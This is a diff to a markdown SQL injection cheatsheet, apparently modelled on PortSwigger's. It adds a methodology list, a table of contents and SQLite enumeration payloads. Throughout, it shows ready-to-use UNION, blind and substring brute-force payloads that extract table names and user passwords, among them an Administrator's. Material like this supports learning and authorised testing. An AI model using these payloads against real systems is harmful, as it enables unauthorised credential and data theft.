@@ -5,7 +5,43 @@ The following cheatsheet is mainly inspired by portswigger cheatsheet.
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 
-# SQL INJECTION :
+# SQLi methodology : <br>
+- find the number of column <br>
+- type of data<br>
+- type of db (oracle,MySql, postgresql , ...) and version <br>
+- enumerate the db<br>
+<br>
+
+# summary : 
+* [sql injection basic](#sql-injection-basic)
+    * [retieve information](#retrive-information-)
+    * [bypass login form](#bypass-login-form-)
+    * [enumerate columns](#enumerate-columns-)
+    * [found specific data type in a column](#found-a-specific-data-type-in-a-column-)
+* [retrieve multiple values using single columns](#retrive-multiple-values-using-a-single-colummns)
+    * [oracle retrieve multiple values using single columns](#oracle-)
+    * [mysql/sqlite retrieve multiple values using single columns](#mysqlsqllite)
+    * [postgresql retrieve multiple values using single columns](#postgresql)
+* [information on the database](#information-on-the-database)
+    * [enumerate version](#enumerate-version)
+* [manipulate query to find the database](#manipulate-query-to-find-the-database)
+    * [manipulate oracle query](#manipulate-oracle-query)
+    * [manipulate mysql query](#manipulate-mysql-query)
+* [retrieve  content from the database ](#retrieve-content-of-database-execept-oracle-db)
+    * [retrieve  content from oracle database](#retrieve-content-from-oracle-db-)
+    * [retrieve  content from the sqlite databse](#retrieve-content-from-sqlite-db)
+* [Blind sql injection](#blind-sqli)
+    * [Blind sql injection trigger by condition response](#exploiting-blind-sqli-by-triggering-condition-response)
+    * [Blind sql injection using bruteforce with substring()](#bruteforce)
+    * [Blind sql injection using syntax error](#inducing-conditional--error)
+    * [Blind sql injection time based ](#blind-sql-time-based)
+    * [Blind sql injection using conditional time delays](#blindsqli-with-conditional-time-delays-in-order-to-leak-info)
+* [sql injection using mysql inset queries](#particularity-of-mysql-insert-queries-)
+* [more tricks](#trick)
+* [sources](#source)
+
+
+## Sql injection basic:
 
 ##### retrive information : 
 
@@ -29,7 +65,7 @@ password : asdf
 
 ```
 
-### enumerate columns :  
+##### enumerate columns :  
 
  use  UNION operator which allow us to make a second sql query.
 
@@ -76,7 +112,7 @@ null is convertible to common data type like integer, string ..
 
 
 
-### found a specific data type in a column :
+#### found a specific data type in a column :
 
 once  we enumerate the number of column with the previous technique
 
@@ -94,9 +130,9 @@ Based on the behaviour of the page we can find the data type of a specific colum
 
 
 
-### retrive multiple values using a single colummns 
+### Retrive multiple values using a single colummns 
 
-**ORACLE** : 
+#### **ORACLE** : 
 
 with the || sequence , this pipe operateur is use for concatenation
 
@@ -108,14 +144,14 @@ with the || sequence , this pipe operateur is use for concatenation
 username and password will be retrieve separated by ~
 
 
-**MySql**: 
+#### **MySql/sqlLite**: 
 
 ```sql
 ' union select group_concat(password) from users --
 ```
 The operator group_concat() can also be use in sqlite database.
 
-**Postgresql**: 
+#### **Postgresql**: 
 
 ```sql
 ' union select string_agg(password,(select chr(95))) from users --
@@ -124,17 +160,22 @@ chr(95) = '-'<br>
 password will be printed separated by '-'
 
 
-# Info on the Database
-#### database version 
+## Information on the Database 
 
- 
+
+### enumerate version 
+
 ```sql
 Microsoft, MySQL	SELECT @@version
 Oracle	SELECT * FROM v$version
 PostgreSQL	SELECT version()
+sqlite SELECT sqlite_version()
 ```
+If you can't use version in order to find the database you can  use the following tricks to find it.
 
-#### oracle
+### manipulate query to find the database
+
+#### manipulate oracle query
 
 In a oracle db, if we are using a union query injection we need to use a valid table name.
 
@@ -144,7 +185,7 @@ SELECT null,null,... FROM v$instance  // in order to enumerate the number of col
 
 SELECT banner,null.. FROM v$instance // to enumerate the version of the db
 
-### MySQL 
+### manipulate MySQL query
 
 comment :  "-- " don't forget the space after the '--'
 
@@ -170,7 +211,7 @@ version :
 (if the data type of the second column is string)
 
 
-### list content of database (execept Oracle db): 
+### retrieve content of database (execept Oracle db): 
 
 
 Table name : 
@@ -187,7 +228,7 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'admin_use
 
 
 
-### On oracle db : 
+### retrieve content from oracle db : 
 
 enumerate the version: 
 ```sql
@@ -210,6 +251,25 @@ retrieve information:
 
 ```sql
 SELECT null , username || '-' || password  FROM admin_users --
+```
+
+### retrieve content from sqlite db:
+
+(in our example the orignal table where the injection happen got 3 columns) 
+enumerate the version
+
+```sql
+union select sqlite_version(),null,null  --
+```
+enumerate table name:
+
+```sql
+union select group_concat(tbl_name),null,null from sqlite_master where type='table'  --
+```
+enumerate column name:
+
+```sql
+union select  group_concat(sql)null,null from sqlite_master where tbl_name='YOURTABLE_NAME'
 ```
 
 ## Blind sqli 
@@ -284,14 +344,14 @@ Bruteforce is possible:
 ```sql
 AZERTY' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
 ```
-SUBSTRING(string,debut,fin)
+SUBSTRING(string,start,end)
 
 We can bruteforce each characters with this technique : 
 
-SUBSTRING(string,1,1)
-SUBSTRING(string,1,2)
-....
-SUBSTRING(string,1,n)
+- SUBSTRING(string,1,1)
+- SUBSTRING(string,1,2)
+- ....
+- SUBSTRING(string,1,n)
 
 
 
@@ -389,7 +449,7 @@ insert into users(username,password,comment) values('jeyanthan','hello','nothing
 Once connected as 'jeyanthan1' the version of the Mysql db should be reflected.
 
 
-#### other 
+#### trick 
 
 injection parameter : <br>
 -try to end the query with --, #, -- (with the additional space)<br>
@@ -398,17 +458,7 @@ injection parameter : <br>
  You can also exfiltrate informations directly using 'and' :   ' and substring(password,1,1)='a' --<br>
 -if the parameter use an integer either 'or' and ';' may work ! <br>
 
-<br>
-SQLi : <br>
-find the number of column <br>
-type of data<br>
-type of db (oracle,MySql, postgresql , ...)<br>
-enumerate the db<br>
 
-
-
-
-<br>
 
 # Source: 
 
